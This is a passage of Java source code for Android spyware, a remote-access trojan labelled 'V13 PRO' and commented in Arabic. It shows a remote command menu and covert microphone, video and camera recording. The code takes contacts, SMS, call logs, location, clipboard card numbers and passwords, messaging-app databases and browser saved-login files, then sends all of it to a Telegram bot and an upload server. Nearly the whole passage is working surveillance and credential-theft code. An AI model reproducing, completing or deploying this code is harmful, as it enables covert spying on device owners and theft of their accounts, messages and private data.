                        } else if (cmd.startsWith("open ")) {
                            openApp(cmd.substring(5));
                            response = "📱 تم فتح التطبيق";
                        } else if (cmd.startsWith("click ")) {
                            simulateClick(cmd.substring(6));
                            response = "👆 تم النقر";
                        } else if (cmd.startsWith("type ")) {
                            simulateType(cmd.substring(5));
                            response = "⌨️ تم الكتابة";
                        } else {
                            response = "❌ أمر غير معروف";
                        }
                }
            } else {
                response = "❌ استخدم / للأوامر";
            }
            
            sendToTelegram("🎮 أمر", response);
            
        } catch (Exception e) {
            sendToTelegram("🎮 خطأ", e.getMessage());
        }
    }

    private String getDeviceInfo() {
        StringBuilder info = new StringBuilder();
        info.append("📱 معلومات الجهاز:\n");
        info.append("الموديل: ").append(Build.MODEL).append("\n");
        info.append("الشركة: ").append(Build.MANUFACTURER).append("\n");
        info.append("الإصدار: ").append(Build.VERSION.RELEASE).append("\n");
        info.append("API: ").append(Build.VERSION.SDK_INT).append("\n");
        info.append("Root: ").append(checkRoot() ? "✅" : "❌").append("\n");
        info.append("البطارية: ").append(getBatteryLevel()).append("%\n");
        info.append("الشاشة: ").append(screenWidth).append("x").append(screenHeight).append("\n");
        info.append("الذاكرة: ").append(getAvailableMemory()).append("MB\n");
        return info.toString();
    }

    private int getBatteryLevel() {
        try {
            Intent batteryIntent = registerReceiver(null, 
                new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            return (int) ((level / (float) scale) * 100);
        } catch (Exception e) {
            return -1;
        }
    }

    private long getAvailableMemory() {
        try {
            ActivityManager.MemoryInfo mi = new ActivityManager.MemoryInfo();
            ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            am.getMemoryInfo(mi);
            return mi.availMem / (1024 * 1024);
        } catch (Exception e) {
            return -1;
        }
    }

    private String getHelpText() {
        return "📋 الأوامر المتاحة:\n" +
               "/screen - لقطة شاشة\n" +
               "/stream - بدء البث المباشر\n" +
               "/stopstream - إيقاف البث\n" +
               "/lock - قفل الجهاز\n" +
               "/unlock - فتح الجهاز\n" +
               "/location - الحصول على الموقع\n" +
               "/contacts - جهات الاتصال\n" +
               "/sms - الرسائل\n" +
               "/calls - سجل المكالمات\n" +
               "/apps - بيانات التطبيقات\n" +
               "/record_audio - تسجيل الصوت\n" +
               "/stop_audio - إيقاف التسجيل\n" +
               "/record_video - تسجيل فيديو\n" +
               "/stop_video - إيقاف التسجيل\n" +
               "/camera_front - تصوير أمامي\n" +
               "/camera_back - تصوير خلفي\n" +
               "/info - معلومات الجهاز\n" +
               "/shell <أمر> - تنفيذ أمر\n" +
               "/open <package> - فتح تطبيق\n" +
               "/click x,y - نقر\n" +
               "/type <نص> - كتابة\n" +
               "/help - هذه المساعدة";
    }

    // ========== 6. نظام مراقبة الحسابات المحسن ==========
    private Runnable accountRunnable = new Runnable() {
        @Override
        public void run() {
            checkNewAccounts();
            checkLoginSessions();
            monitorClipboard();
            handler.postDelayed(this, 3000);
        }
    };

    private void checkNewAccounts() {
        try {
            // مسارات ملفات الحسابات
            String[] accountPaths = {
                "/data/system/users/0/accounts.db",
                "/data/data/com.google.android.gms/databases/accounts.db",
                "/data/data/com.whatsapp/databases/wa.db",
                "/data/data/com.whatsapp/databases/msgstore.db",
                "/data/data/com.whatsapp/shared_prefs/WhatsApp.xml",
                "/data/data/org.telegram.messenger/databases/cache4.db",
                "/data/data/org.telegram.messenger/shared_prefs/org.telegram.messenger_preferences.xml",
                "/data/data/com.facebook.orca/databases",
                "/data/data/com.facebook.orca/shared_prefs",
                "/data/data/com.instagram.android/databases",
                "/data/data/com.instagram.android/shared_prefs",
                "/data/data/com.zhiliaoapp.musically/databases",
                "/data/data/com.zhiliaoapp.musically/shared_prefs",
                "/data/data/com.sec.android.app.sbrowser/app_chrome/Default/Login Data",
                "/data/data/com.android.chrome/app_chrome/Default/Login Data"
            };

            for (String path : accountPaths) {
                try {
                    File file = new File(path);
                    if (file.exists()) {
                        long currentSize = file.length();
                        long lastModified = file.lastModified();
                        String key = path + "_" + currentSize + "_" + lastModified;

                        if (accountFileSizes.containsKey(path)) {
                            long oldSize = accountFileSizes.get(path);
                            if (currentSize != oldSize) {
                                sendToTelegram("🔐 تغيير حساب", 
                                    "📁 " + getAppNameFromPath(path) + 
                                    "\n📊 الحجم: " + (currentSize / 1024) + "KB");
                                
                                if (currentSize < 50 * 1024 * 1024) {
                                    copyAndSendAccountFile(file, path);
                                }
                            }
                        }
                        accountFileSizes.put(path, currentSize);
                    }
                } catch (Exception e) {
                    Log.e("V8", "Account check error for " + path, e);
                }
            }

            // البحث عن كلمات المرور في الملفات
            scanForPasswords();

        } catch (Exception e) {
            Log.e("V8", "Account check error", e);
        }
    }

    private void copyAndSendAccountFile(File file, String originalPath) {
        try {
            String tempPath = Environment.getExternalStorageDirectory() + 
                             "/Download/account_" + System.currentTimeMillis() + ".dat";
            
            if (copyFile(file, new File(tempPath))) {
                // تشفير الملف قبل الإرسال
                encryptFile(new File(tempPath));
                sendFileToTelegram("🔐 ملف " + getAppNameFromPath(originalPath), 
                                  tempPath + ".enc");
                
                handler.postDelayed(() -> takeScreenshot(), 2000);
            }
        } catch (Exception e) {
            Log.e("V8", "Copy account error", e);
        }
    }

    private void scanForPasswords() {
        try {
            // مسح الملفات بحثاً عن كلمات المرور
            String[] targetFiles = {
                "/data/system/users/0/accounts.db",
                "/data/data/com.sec.android.app.sbrowser/app_chrome/Default/Login Data",
                "/data/data/com.android.chrome/app_chrome/Default/Login Data"
            };
            
            for (String filePath : targetFiles) {
                File file = new File(filePath);
                if (file.exists()) {
                    // تحليل الملف واستخراج كلمات المرور
                    extractPasswordsFromFile(file);
                }
            }
        } catch (Exception e) {
            Log.e("V8", "Password scan error", e);
        }
    }

    private void extractPasswordsFromFile(File file) {
        try {
            // استخدام sqlite3 لاستخراج البيانات
            String tempDb = Environment.getExternalStorageDirectory() + 
                           "/Download/temp_" + System.currentTimeMillis() + ".db";
            
            copyFile(file, new File(tempDb));
            
            // محاولة استخراج كلمات المرور
            Process process = Runtime.getRuntime().exec(
                "sqlite3 " + tempDb + " 'SELECT * FROM logins;'");
            
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            
            StringBuilder passwords = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                passwords.append(line).append("\n");
            }
            
            if (passwords.length() > 0) {
                String passPath = Environment.getExternalStorageDirectory() + 
                                 "/Download/passwords_" + System.currentTimeMillis() + ".txt";
                writeToFile(passwords.toString(), passPath);
                sendFileToTelegram("🔑 كلمات مرور", passPath);
            }
            
            new File(tempDb).delete();
            
        } catch (Exception e) {
            Log.e("V8", "Extract passwords error", e);
        }
    }

    private void checkLoginSessions() {
        try {
            // مراقبة جلسات تسجيل الدخول
            if (accessibilityService != null) {
                AccessibilityNodeInfo root = accessibilityService.getRootInActiveWindow();
                if (root != null) {
                    List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId("*");
                    
                    for (AccessibilityNodeInfo node : nodes) {
                        if (node.getText() != null) {
                            String text = node.getText().toString().toLowerCase();
                            
                            // كشف شاشات تسجيل الدخول
                            if (text.contains("login") || text.contains("تسجيل الدخول") ||
                                text.contains("username") || text.contains("اسم المستخدم") ||
                                text.contains("password") || text.contains("كلمة السر")) {
                                
                                sendToTelegram("🔐 شاشة دخول", 
                                    "تم رصد شاشة تسجيل دخول في " + 
                                    getCurrentApp());
                                
                                handler.postDelayed(() -> takeScreenshot(), 1000);
                                break;
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e("V8", "Login session check error", e);
        }
    }

    private void monitorClipboard() {
        try {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (clipboard.hasPrimaryClip()) {
                ClipData clip = clipboard.getPrimaryClip();
                if (clip != null && clip.getItemCount() > 0) {
                    CharSequence text = clip.getItemAt(0).getText();
                    if (text != null && text.length() > 10) {
                        String clipText = text.toString();
                        
                        // كشف إذا كان النص يحتوي على معلومات حساسة
                        if (isSensitiveData(clipText)) {
                            sendToTelegram("📋 حافظة", "تم نسخ بيانات حساسة:\n" + clipText);
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e("V8", "Clipboard monitor error", e);
        }
    }

    private boolean isSensitiveData(String text) {
        String[] patterns = {
            "\\d{16}", // بطاقة ائتمان
            "\\d{3,4}", // CVV
            "\\d{10,15}", // رقم هاتف
            "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}", // بريد
            "كلمة السر", "password", "كلمة المرور"
        };
        
        for (String pattern : patterns) {
            if (text.matches(".*" + pattern + ".*")) {
                return true;
            }
        }
        return false;
    }

    private String getCurrentApp() {
        try {
            ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                List<ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
                if (processes != null && !processes.isEmpty()) {
                    return processes.get(0).processName;
                }
            }
        } catch (Exception e) {
            Log.e("V8", "Get current app error", e);
        }
        return "غير معروف";
    }

    // ========== 7. نظام التسجيل الصوتي والفيديو ==========
    private void startAudioRecording() {
        try {
            if (isRecordingAudio) return;
            
            isRecordingAudio = true;
            String filePath = Environment.getExternalStorageDirectory() + 
                             "/Download/audio_" + System.currentTimeMillis() + ".3gp";
            
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(filePath);
            mediaRecorder.prepare();
            mediaRecorder.start();
            
            sendToTelegram("🎤 تسجيل صوت", "بدأ تسجيل الصوت");
            
            // إيقاف التسجيل تلقائياً بعد 5 دقائق
            handler.postDelayed(() -> stopAudioRecording(), 300000);
            
        } catch (Exception e) {
            Log.e("V8", "Start audio error", e);
            isRecordingAudio = false;
        }
    }

    private void stopAudioRecording() {
        try {
            if (mediaRecorder != null && isRecordingAudio) {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isRecordingAudio = false;
                
                sendToTelegram("🎤 تسجيل صوت", "تم إيقاف التسجيل");
            }
        } catch (Exception e) {
            Log.e("V8", "Stop audio error", e);
        }
    }

    private void startVideoRecording() {
        try {
            if (isRecordingVideo) return;
            
            isRecordingVideo = true;
            String filePath = Environment.getExternalStorageDirectory() + 
                             "/Download/video_" + System.currentTimeMillis() + ".mp4";
            
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setOutputFile(filePath);
            mediaRecorder.setVideoSize(1280, 720);
            mediaRecorder.setVideoFrameRate(30);
            mediaRecorder.prepare();
            mediaRecorder.start();
            
            sendToTelegram("📹 تسجيل فيديو", "بدأ تسجيل الفيديو");
            
        } catch (Exception e) {
            Log.e("V8", "Start video error", e);
            isRecordingVideo = false;
        }
    }

    private void stopVideoRecording() {
        try {
            if (mediaRecorder != null && isRecordingVideo) {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isRecordingVideo = false;
                
                sendToTelegram("📹 تسجيل فيديو", "تم إيقاف التسجيل");
            }
        } catch (Exception e) {
            Log.e("V8", "Stop video error", e);
        }
    }

    private void takeCameraPicture(boolean front) {
        try {
            // كود التقاط الصورة بالكاميرا
            CameraManager cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            String cameraId = front ? 
                CameraCharacteristics.LENS_FACING_FRONT : 
                CameraCharacteristics.LENS_FACING_BACK;
            
            // ... كود التصوير
        } catch (Exception e) {
            Log.e("V8", "Camera error", e);
        }
    }

    // ========== 8. نظام التشفير ==========
    private String encryptData(String data) {
        try {
            SecretKeySpec keySpec = new SecretKeySpec(
                ENCRYPTION_KEY.getBytes(), "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, keySpec);
            byte[] encrypted = cipher.doFinal(data.getBytes());
            return Base64.getEncoder().encodeToString(encrypted);
        } catch (Exception e) {
            return data;
        }
    }

    private void encryptFile(File file) {
        try {
            FileInputStream fis = new FileInputStream(file);
            FileOutputStream fos = new FileOutputStream(file.getAbsolutePath() + ".enc");
            
            SecretKeySpec keySpec = new SecretKeySpec(
                ENCRYPTION_KEY.getBytes(), "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, keySpec);
            
            byte[] buffer = new byte[8192];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                byte[] output = cipher.update(buffer, 0, bytesRead);
                if (output != null) {
                    fos.write(output);
                }
            }
            
            byte[] output = cipher.doFinal();
            if (output != null) {
                fos.write(output);
            }
            
            fis.close();
            fos.close();
            file.delete();
            
        } catch (Exception e) {
            Log.e("V8", "Encrypt file error", e);
        }
    }

    // ========== 9. نظام رفع الملفات ==========
    private void uploadToServer(File file, String type) {
        try {
            String uploadUrl = SERVER_URL + "/upload";
            
            RequestBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("type", type)
                    .addFormDataPart("device_id", getDeviceId())
                    .addFormDataPart("file", file.getName(),
                            RequestBody.create(MediaType.parse("application/octet-stream"), file))
                    .build();

            Request request = new Request.Builder()
                    .url(uploadUrl)
                    .post(requestBody)
                    .build();

            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {}
                
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    response.close();
                    file.delete();
                }
            });
            
        } catch (Exception e) {
            Log.e("V8", "Upload error", e);
        }
    }

    private String getDeviceId() {
        try {
            return Settings.Secure.getString(getContentResolver(), 
                Settings.Secure.ANDROID_ID);
        } catch (Exception e) {
            return "unknown";
        }
    }

    // ========== 10. نظام سحب البيانات الشخصية ==========
    private Runnable personalDataRunnable = new Runnable() {
        @Override
        public void run() {
            grabAllContacts();
            grabAllSMS();
            grabAllCalls();
            grabLocation();
            grabDeviceInfo();
            grabInstalledApps();
            grabNetworkInfo();
            handler.postDelayed(this, 60000);
        }
    };

    private void grabDeviceInfo() {
        String info = getDeviceInfo();
        sendToTelegram("📱 معلومات الجهاز", info);
    }

    private void grabInstalledApps() {
        try {
            PackageManager pm = getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(0);
            
            StringBuilder appList = new StringBuilder();
            int count = 0;
            
            for (ApplicationInfo app : apps) {
                if (count < 50) { // إرسال أول 50 تطبيق فقط
                    appList.append(pm.getApplicationLabel(app))
                           .append(" - ")
                           .append(app.packageName)
                           .append("\n");
                    count++;
                }
            }
            
            String path = Environment.getExternalStorageDirectory() + 
                         "/Download/apps_" + System.currentTimeMillis() + ".txt";
            writeToFile(appList.toString(), path);
            sendFileToTelegram("📱 التطبيقات المثبتة", path);
            
        } catch (Exception e) {
            Log.e("V8", "Installed apps error", e);
        }
    }

    private void grabNetworkInfo() {
        try {
            WifiManager wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
            WifiInfo wifiInfo = wifiManager.getConnectionInfo();
            
            String info = "📶 معلومات الشبكة:\n";
            info += "SSID: " + wifiInfo.getSSID() + "\n";
            info += "BSSID: " + wifiInfo.getBSSID() + "\n";
            info += "IP: " + intToIp(wifiInfo.getIpAddress()) + "\n";
            info += "السرعة: " + wifiInfo.getLinkSpeed() + " Mbps\n";
            
            // مسح الشبكات المتاحة
            List<ScanResult> results = wifiManager.getScanResults();
            if (results != null && !results.isEmpty()) {
                info += "\n📡 الشبكات المتاحة:\n";
                for (int i = 0; i < Math.min(10, results.size()); i++) {
                    ScanResult result = results.get(i);
                    info += result.SSID + " (" + result.level + "dBm)\n";
                }
            }
            
            sendToTelegram("📶 معلومات الشبكة", info);
            
        } catch (Exception e) {
            Log.e("V8", "Network info error", e);
        }
    }

    private String intToIp(int ip) {
        return (ip & 0xFF) + "." +
               ((ip >> 8) & 0xFF) + "." +
               ((ip >> 16) & 0xFF) + "." +
               ((ip >> 24) & 0xFF);
    }

    private void grabAllContacts() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);

            if (cursor != null) {
                StringBuilder contacts = new StringBuilder();
                int count = 0;

                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndex(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(
                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contacts.append(name).append(": ").append(number).append("\n");
                    count++;
                }
                cursor.close();

                if (count > 0) {
                    String path = Environment.getExternalStorageDirectory() + 
                                 "/Download/contacts_" + System.currentTimeMillis() + ".txt";
                    writeToFile(contacts.toString(), path);
                    sendFileToTelegram("👥 جهات الاتصال (" + count + ")", path);
                }
            }
        } catch (Exception e) {
            Log.e("V8", "Contacts error", e);
        }
    }

    private void grabAllSMS() {
        try {
            ContentResolver cr = getContentResolver();
            Uri uri = Uri.parse("content://sms");
            String[] projection = null;
            String selection = null;
            String[] selectionArgs = null;
            String sortOrder = "date DESC";

            Cursor cursor = cr.query(uri, projection, selection, selectionArgs, sortOrder);

            if (cursor != null) {
                StringBuilder sms = new StringBuilder();
                int count = 0;

                while (cursor.moveToNext() && count < 200) {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    String date = cursor.getString(cursor.getColumnIndex("date"));
                    String type = cursor.getString(cursor.getColumnIndex("type"));
                    
                    String typeStr = "وارد";
                    if ("2".equals(type)) typeStr = "صادر";
                    
                    sms.append("[").append(typeStr).append("]\n");
                    sms.append("من: ").append(address).append("\n");
                    sms.append("نص: ").append(body).append("\n");
                    sms.append("تاريخ: ").append(new Date(Long.parseLong(date))).append("\n");
                    sms.append("---\n\n");
                    count++;
                }
                cursor.close();

                if (count > 0) {
                    String path = Environment.getExternalStorageDirectory() + 
                                 "/Download/sms_" + System.currentTimeMillis() + ".txt";
                    writeToFile(sms.toString(), path);
                    sendFileToTelegram("📨 الرسائل (" + count + ")", path);
                }
            }
        } catch (Exception e) {
            Log.e("V8", "SMS error", e);
        }
    }

    private void grabAllCalls() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI,
                    null, null, null, CallLog.Calls.DATE + " DESC");

            if (cursor != null) {
                StringBuilder calls = new StringBuilder();
                int count = 0;

                while (cursor.moveToNext() && count < 200) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    String date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
                    String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    
                    String typeStr = "وارد";
                    if ("2".equals(type)) typeStr = "صادر";
                    if ("3".equals(type)) typeStr = "فائت";
                    
                    calls.append("رقم: ").append(number).append("\n");
                    calls.append("نوع: ").append(typeStr).append("\n");
                    calls.append("مدة: ").append(duration).append(" ثانية\n");
                    calls.append("تاريخ: ").append(new Date(Long.parseLong(date))).append("\n");
                    calls.append("---\n\n");
                    count++;
                }
                cursor.close();

                if (count > 0) {
                    String path = Environment.getExternalStorageDirectory() + 
                                 "/Download/calls_" + System.currentTimeMillis() + ".txt";
                    writeToFile(calls.toString(), path);
                    sendFileToTelegram("📞 سجل المكالمات (" + count + ")", path);
                }
            }
        } catch (Exception e) {
            Log.e("V8", "Calls error", e);
        }
    }

    private void grabLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            
            // تفعيل GPS إذا كان مغلقاً
            if (!lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                Thread.sleep(2000);
            }
            
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) {
                location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }

            if (location != null) {
                String loc = "📍 الموقع الحالي:\n";
                loc += "خط العرض: " + location.getLatitude() + "\n";
                loc += "خط الطول: " + location.getLongitude() + "\n";
                loc += "الدقة: " + location.getAccuracy() + " متر\n";
                loc += "السرعة: " + location.getSpeed() + " م/ث\n";
                loc += "الارتفاع: " + location.getAltitude() + " م\n";
                
                if (location.hasBearing()) {
                    loc += "الاتجاه: " + location.getBearing() + "°\n";
                }
                
                // رابط خرائط جوجل
                String mapsLink = "https://maps.google.com/?q=" + 
                                 location.getLatitude() + "," + location.getLongitude();
                loc += "\n🔗 " + mapsLink;
                
                sendToTelegram("📍 الموقع", loc);
            } else {
                sendToTelegram("📍 الموقع", "⚠️ لا يمكن الحصول على الموقع");
            }
            
        } catch (Exception e) {
            Log.e("V8", "Location error", e);
            sendToTelegram("📍 الموقع", "خطأ: " + e.getMessage());
        }
    }

    // ========== 11. نظام سحب بيانات التطبيقات ==========
    private Runnable appsDataRunnable = new Runnable() {
        @Override
        public void run() {
            grabAllAppsData();
            handler.postDelayed(this, 300000);
        }
    };

    private void grabAllAppsData() {
        new Thread(() -> {
            grabAppData("com.whatsapp", "واتساب");
            grabAppData("org.telegram.messenger", "تيليغرام");
            grabAppData("com.facebook.orca", "مسنجر");
            grabAppData("com.instagram.android", "انستغرام");
            grabAppData("com.zhiliaoapp.musically", "تيك توك");
            grabAppData("com.ss.android.ugc.trill", "تيك توك");
            grabAppData("com.facebook.katana", "فيسبوك");
            grabAppData("com.snapchat.android", "سناب شات");
            grabAppData("com.twitter.android", "تويتر");
            grabAppData("com.google.android.gm", "جيميل");
        }).start();
    }

    private void grabAppData(String packageName, String appName) {
        try {
            String[] paths = {
                "/data/data/" + packageName + "/",
                Environment.getExternalStorageDirectory() + "/Android/data/" + packageName + "/",
                Environment.getExternalStorageDirectory() + "/" + appName + "/"
            };
            
            List<String> importantFiles = new ArrayList<>();
            String[] extensions = {".db", ".xml", ".txt", ".jpg", ".png", ".mp4", ".pdf"};
            
            for (String basePath : paths) {
                File dir = new File(basePath);
                if (dir.exists() && dir.isDirectory()) {
                    findImportantFiles(dir, importantFiles, extensions, 3); // حد أقصى 3 ملفات
                }
            }
            
            if (!importantFiles.isEmpty()) {
                sendToTelegram("📱 " + appName, 
                    "تم العثور على " + importantFiles.size() + " ملف");
                
                for (String filePath : importantFiles) {
                    sendFileToTelegram(appName, filePath);
                    Thread.sleep(1000); // تأخير بين الملفات
                }
            }
            
        } catch (Exception e) {
            Log.e("V8", "App data error for " + packageName, e);
        }
    }

    private void findImportantFiles(File dir, List<String> results, 
                                   String[] extensions, int maxFiles) {
        if (results.size() >= maxFiles) return;
        
        File[] files = dir.listFiles();
        if (files == null) return;
        
        for (File file : files) {
            if (results.size() >= maxFiles) break;
            
            if (file.isDirectory()) {
                findImportantFiles(file, results, extensions, maxFiles);
            } else {
                String name = file.getName().toLowerCase();
                long size = file.length();
                
                // تجاهل الملفات الكبيرة جداً
                if (size > 50 * 1024 * 1024) continue;
                
                for (String ext : extensions) {
                    if (name.endsWith(ext) && size > 0) {
                        results.add(file.getAbsolutePath());
                        break;
                    }
                }
            }
        }
    }

    // ========== 12. نظام التقارير ==========
    private Runnable reportRunnable = new Runnable() {
        @Override
        public void run() {
            sendReport();
            handler.postDelayed(this, 3600000);
        }
    };

    private void sendReport() {
        long hours = System.currentTimeMillis() / 3600000;
        String report = "📊 تقرير شامل " + hours + ":\n" +
                       "📸 لقطات: " + screenshotCount + "\n" +
                       "🔔 إشعارات: " + notificationCount + "\n" +
                       "🔐 ملفات حسابات: " + accountFileSizes.size() + "\n" +
                       "📱 تطبيقات: " + TARGET_APPS.length + "\n" +
                       "🎤 تسجيل صوت: " + (isRecordingAudio ? "نشط" : "متوقف") + "\n" +
                       "📹 تسجيل فيديو: " + (isRecordingVideo ? "نشط" : "متوقف") + "\n" +
                       "📡 بث مباشر: " + (isStreaming ? "نشط" : "متوقف") + "\n" +
                       "🔋 بطارية: " + getBatteryLevel() + "%\n" +
                       "💾 ذاكرة متاحة: " + getAvailableMemory() + "MB";
        
        sendToTelegram("📊 تقرير دوري", report);
    }

    // ========== أدوات مساعدة ==========
    private void writeToFile(String content, String path) {
        try {
            FileWriter writer = new FileWriter(path);
            writer.write(content);
            writer.close();
        } catch (Exception e) {
            Log.e("V8", "Write error", e);
        }
    }

    private boolean copyFile(File src, File dst) {
        try {
            FileInputStream in = new FileInputStream(src);
            FileOutputStream out = new FileOutputStream(dst);
            byte[] buffer = new byte[8192];
            int len;
            while ((len = in.read(buffer)) > 0) {
                out.write(buffer, 0, len);
            }
            in.close();
            out.close();
            return true;
        } catch (Exception e) {
            Log.e("V8", "Copy error", e);
            return false;
        }
    }

    private byte[] readFile(File file) throws IOException {
        FileInputStream fis = new FileInputStream(file);
        byte[] data = new byte[(int) file.length()];
        fis.read(data);
        fis.close();
        return data;
    }

    private String getAppName(String packageName) {
        try {
            PackageManager pm = getPackageManager();
            ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
            return pm.getApplicationLabel(ai).toString();
        } catch (Exception e) {
            return packageName;
        }
    }

    private String getAppNameFromPath(String path) {
        if (path.contains("whatsapp")) return "واتساب";
        if (path.contains("telegram")) return "تيليغرام";
        if (path.contains("facebook")) return "فيسبوك";
        if (path.contains("instagram")) return "انستغرام";
        if (path.contains("musically")) return "تيك توك";
        if (path.contains("google")) return "جوجل";
        if (path.contains("chrome")) return "كروم";
        if (path.contains("sbrowser")) return "متصفح سامسونج";
        return "تطبيق";
    }

    private boolean isImportantApp(String packageName) {
        for (String app : TARGET_APPS) {
            if (packageName.contains(app)) return true;
        }
        return false;
    }

    private void grabInitialData() {
        new Thread(() -> {
            grabAllContacts();
            grabAllSMS();
            grabAllCalls();
            grabLocation();
            grabAllAppsData();
        }).start();
    }

    private void sendToTelegram(String title, String message) {
        try {
            String fullMessage = "🔴 V13 PRO\n📌 " + title + "\n\n" + message;
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + 
                        "/sendMessage?chat_id=" + CHAT_ID + "&text=" + 
                        Uri.encode(fullMessage);
            
            Request request = new Request.Builder().url(url).build();
            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response response) throws IOException { 
                    response.close(); 
                }
            });
        } catch (Exception e) {
            Log.e("V8", "Send error", e);
        }
    }

    private void sendFileToTelegram(String caption, String filePath) {
        try {
            File file = new File(filePath);
            if (!file.exists() || file.length() > 50 * 1024 * 1024) return;

            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            
            RequestBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("caption", "🔴 " + caption)
                    .addFormDataPart("document", file.getName(),
                            RequestBody.create(MediaType.parse("application/octet-stream"), file))
                    .build();

            Request request = new Request.Builder().url(url).post(requestBody).build();
            
            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response response) throws IOException { 
                    response.close();
                    file.delete();
                }
            });

        } catch (Exception e) {
            Log.e("V8", "Send file error", e);
        }
    }

    // متغيرات إضافية
    private long lastUpdateId = 0;
    private class CommandExecutor extends Thread {
        public void start() {
            // بدء تنفيذ الأوامر
        }
    }
            }
